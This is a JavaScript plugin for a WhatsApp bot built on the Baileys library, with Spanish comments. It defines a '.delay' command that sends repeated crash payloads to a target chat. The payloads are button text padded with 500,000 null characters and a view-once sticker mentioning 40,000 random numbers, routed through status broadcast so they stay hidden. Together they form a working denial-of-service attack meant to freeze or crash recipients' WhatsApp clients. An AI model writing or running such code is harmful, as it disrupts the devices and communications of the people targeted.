import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

let handler = async (m, { conn }) => {
  const jid = m.chat;

  try {
    for (let i = 0; i < 20; i++) {
      await InVisibleX(conn, jid, true);
      await xatanicaldelayv2(conn, jid, true);
      await delay(10);
    }

    // ✅ MENSAJE FINAL - También invisible para el bot
    const msg = await generateWAMessageFromContent(jid, {
      extendedTextMessage: {
        text: "✅ Delay enviado 200 veces.",
        contextInfo: {},
      }
    }, { userJid: conn.user.id });

    await conn.relayMessage(jid, msg.message, { messageId: msg.key.id });

  } catch (e) {
    console.error("❌ Error en delay:", e);
    await conn.sendMessage(jid, { text: "❌ Error:\n" + e.message }, { quoted: m });
  }
};

handler.command = /^delay$/i;
export default handler;

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// 📡 FUNCIONES OCULTAS

async function InVisibleX(conn, jid, mention) {
  const msg = await generateWAMessageFromContent(jid, {
    buttonsMessage: {
      text: "🩸",
      contentText: "@raysofhopee",
      footerText: "vip",
      buttons: [
        {
          buttonId: ".aboutb",
          buttonText: {
            displayText: "HADES VIP!" + "\u0000".repeat(500000),
          },
          type: 1,
        },
      ],
      headerType: 1,
    },
  }, { userJid: conn.user.id });

  await conn.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [jid],
  });

  if (mention) {
    await conn.relayMessage(jid, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25,
          },
        },
      },
    }, {});
  }
}

async function xatanicaldelayv2(conn, jid, mention) {
  const message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath: "/v/t62.7161-24/...",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 40000 }, () =>
                "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
          },
        },
      },
    },
  };

  const msg = await generateWAMessageFromContent(jid, message, {
    userJid: conn.user.id,
  });

  await conn.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [jid],
  });
}